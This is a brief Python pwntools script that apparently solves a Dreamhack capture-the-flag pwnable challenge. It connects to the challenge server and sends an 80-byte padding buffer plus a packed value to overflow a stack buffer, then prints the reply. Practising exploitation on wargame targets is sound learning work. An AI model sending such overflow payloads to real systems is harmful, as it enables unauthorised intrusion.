from pwn import *

port = 15514
rem = remote("host3.dreamhack.games", port)

context.arch = "amd64"

rop = ROP("./Pwnable/awesome-basics/problem/chall")

payload = b'A' * 80 + p64(1)

rem.sendlineafter(b"Input: ", payload)

print(rem.recvline().rstrip())
